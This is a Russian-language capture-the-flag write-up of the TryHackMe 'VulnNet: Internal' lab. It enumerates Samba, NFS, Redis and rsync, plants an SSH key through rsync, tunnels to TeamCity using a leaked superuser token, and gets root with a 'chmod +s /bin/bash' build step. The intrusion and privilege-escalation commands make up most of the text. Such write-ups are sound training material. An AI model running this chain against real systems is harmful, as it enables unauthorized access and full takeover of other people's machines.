# VulnNet: Internal

:white_check_mark:  [**Samba directory browsing**](#samba)

:white_check_mark: [**NFS getting files**](#nfs)

:white_check_mark: [**Redis browsing**](#redis)

:white_check_mark: [**Rsync connection**](#rsync)

:white_check_mark: [**Ssh-keygen**](#ssh)

:white_check_mark: [**TeamCity shell**](#teamcity)

:white_check_mark: [**Ssh tunneling**](#tunneling)
___

## Enumeration
Сканируем ip командой:
```
nmap -sC -sV internal.thm
```

```
PORT     STATE    SERVICE     VERSION                                                                                                                                                                               
22/tcp   open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)                                                                                                                          
| ssh-hostkey:                                                                                                                                                                                                      
|   2048 5e:27:8f:48:ae:2f:f8:89:bb:89:13:e3:9a:fd:63:40 (RSA)                                                                                                                                                      
|   256 f4:fe:0b:e2:5c:88:b5:63:13:85:50:dd:d5:86:ab:bd (ECDSA)                                                                                                                                                     
|_  256 82:ea:48:85:f0:2a:23:7e:0e:a9:d9:14:0a:60:2f:ad (ED25519)                                                                                                                                                   
111/tcp  open     rpcbind     2-4 (RPC #100000)                                                                                                                                                                     
| rpcinfo:                                                                                                                                                                                                          
|   program version    port/proto  service                                                                                                                                                                          
|   100000  2,3,4        111/tcp   rpcbind                                                                                                                                                                          
|   100000  2,3,4        111/udp   rpcbind                                                                                                                                                                          
|   100000  3,4          111/tcp6  rpcbind                                                                                                                                                                          
|   100000  3,4          111/udp6  rpcbind                                                                                                                                                                          
|   100003  3           2049/udp   nfs                                                                                                                                                                              
|   100003  3           2049/udp6  nfs                                                                                                                                                                              
|   100003  3,4         2049/tcp   nfs                                                                                                                                                                              
|   100003  3,4         2049/tcp6  nfs                                                                    
|   100005  1,2,3      37483/tcp   mountd                                                                 
|   100005  1,2,3      50149/tcp6  mountd                                                                 
|   100005  1,2,3      55531/udp   mountd                                                                 
|   100005  1,2,3      59720/udp6  mountd                                                                 
|   100021  1,3,4      39989/udp6  nlockmgr                                                               
|   100021  1,3,4      42813/tcp6  nlockmgr                                                               
|   100021  1,3,4      44887/tcp   nlockmgr                                                               
|   100021  1,3,4      48716/udp   nlockmgr                                                               
|   100227  3           2049/tcp   nfs_acl                                                                
|   100227  3           2049/tcp6  nfs_acl                                                                
|   100227  3           2049/udp   nfs_acl                                                                
|_  100227  3           2049/udp6  nfs_acl                                                                
139/tcp  open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                                                           
445/tcp  open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)                                                                                                                                        
873/tcp  open     rsync       (protocol version 31)                                                       
2049/tcp open     nfs_acl     3 (RPC #100227)                                                             
9090/tcp filtered zeus-admin                                                                              
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

<a name="samba"></a>

## Samba

Посмотрим что есть на **samba**:
```
smbclient -L internal.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/1.png)

Посмотрим что есть в директории **shares**.
```
smbclient //internal.thm/shares
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/2.png)

В директории **temp** находим первый флаг.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/3.png)

<a name="nfs"></a>

## NFS

Также на 2049 порту у нас находится NFS. Используем команду чтобы отобразить все ресурсы.
```
showmount -e internal.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/4.png)

Сначала создадим каталог, чтобы монтировать ресурсы.
```
mkdir /tmp/mount0
```

Затем используем команду **mount**, чтобы смонтировать ресурс NFS на локальной машине. 
```
mount -t nfs internal.thm:/opt/conf /tmp/mount0 -nolock
```

Теперь в директории **/tmp/mount0** мы видим все ресурсы.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/5.png)

<a name="redis"></a>

## Redis

В конфигурационной файле redis находим пароль в зашифрованном виде и расшифровываем.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/6.png)

Получаем пароль:
```
requirepass "<Redacted>"
```

Чтобы подключиться к **redis** установим нужные пакеты:
```
apt install redis-tools
```

Подключаемся к базе данных:
```
redis-cli -h internal.thm -a <Password>
```

Подключившись, просмотрим все содержимое:
```
keys *
```

Посмотрим тип файла флага:
```
type "internal flag"

string
```

Открываем его командой:
```
get "internal flag"
```

Есть еще один интересный файл с названием **authlist**. Посмотри его тип:
```
type "authlist"

list
```

Выведем его содрежимое:
```
lrange "authlist" 1 10000000
```

Получаем закодированную строку. Декодируем ее и получаем следующее:
```
Authorization for rsync://rsync-connect@127.0.0.1 with password <Redacted>
```

<a name="rsync"></a>

## Rsync

Из предыдущего текста можно понять, что мы можем подключиться к машине через **rsync**.

```
rsync rsync://rsync-connect@internal.thm/
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/7.png)

Просматриваем дальше директории и находим каталог **.ssh**. Можем попробовать загрузить свой ключ.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/8.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/9.png)

<a name="ssh"></a>

Генерируем ключ ssh на своей машине:
```
ssh-keygen
```

```
Generating public/private rsa key pair.
Enter file in which to save the key (/root/.ssh/id_rsa): /home/fobblified/Tryhackme/internal/id_rsa
Enter passphrase (empty for no passphrase): 
Enter same passphrase again: 
Your identification has been saved in /home/fobblified/Tryhackme/internal/id_rsa
Your public key has been saved in /home/fobblified/Tryhackme/internal/id_rsa.pub
The key fingerprint is:
SHA256:Q/YspTKdxZrZAdN5IIyj+DcFTuTvm403MrKX49QBRRI root@fobblified
The key's randomart image is:
+---[RSA 3072]----+
|     ..oE++o     |
|     .= .Bo .    |
|   . +.o+ =.     |
|  . . .=.& .     |
|   .  o.S =      |
|    . o+ + .     |
|     . .o..      |
|      ..*=o      |
|      .===..     |
+----[SHA256]-----+
```

Получаем два файла **id_rsa.pub**  и **id_rsa**.

Через rsync добавляем наш публичный ключ в /.ssh/authorized_keys/
```
rsync id_rsa.pub rsync://rsync-connect@internal.thm/files/sys-internal/.ssh/authorized_keys
```

Подлючаем по ключу к машине.
```
ssh -i id_rsa internal.thm
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/10.png)

## TeamCity

Просмотрев директории находим следующую: **TeamCity**. Файл TeamCity-readme.txt:
```
This is the JetBrains TeamCity home directory.

To run the TeamCity server and agent using a console, execute:
* On Windows: `.\bin\runAll.bat start`
* On Linux and macOS: `./bin/runAll.sh start`

By default, TeamCity will run in your browser on `http://localhost:80/` (Windows) or `http://localhost:8111/` (Linux, macOS). If you cannot access the default URL, try these Troubleshooting tips: https://www.jet$

For evaluation purposes, we recommend running both server and agent. If you need to run only the TeamCity server, execute:
* On Windows: `.\bin\teamcity-server.bat start`
* On Linux and macOS: `./bin/teamcity-server.sh start`

For licensing information, see the "licenses" directory.

More information:
TeamCity documentation: https://www.jetbrains.com/help/teamcity/teamcity-documentation.html
TeamCity product page: https://www.jetbrains.com/teamcity/
```

В тексте говорится, что приложение используется на 8111 порту. Проверим это командой:
```
ss -at | grep 8111
```

```
LISTEN    0      100       [::ffff:127.0.0.1]:8111                            *:*
```

Теперь мы точно знаем, что что-то прослушывается на это порту.

<a name="tunneling"></a>

## Ssh Tunneling

Создадим тунелирование на нашу машину командой:
```
ssh sys-internal@internal.thm -i id_rsa -L 8111:127.0.0.1:8111
```

В браузере перейдем по адресу:
```
http://127.0.0.1:8111
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/11.png)

Видим страницу авторизации, но у нас нет данных пользователя. В директории TeamCity в каталоге **logs** можно найти файл **catalina.out**  в котором лежит несколько токенов суперпользователя. Перепробовав все, нужным оказался последний.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/12.png)

<a name="teamcity"></a>

## TeamCity

Продолжаем работу с TeamCity и пытаемся получить доступ к руту.

Создаем новый проект.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/13.png)

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/14.png)

Создаем новую конфигурацию и открываем вкладку **build steps**. Присвоим бит **suid** к **/bin/bash**.
```
chmod +s /bin/bash
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/15.png)

Сохраняем файл и запускаем кнопкой **Run**.

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/16.png)

Так как у **/bin/bash** стоит бит **suid** мы можем получить права рута. На машине используем команду:
```
/bin/bash -p 
```

![](https://github.com/fobblified/Writeups/blob/main/Tryhackme/assets/VulnNet_Internal/17.png)

Мы получили рута.
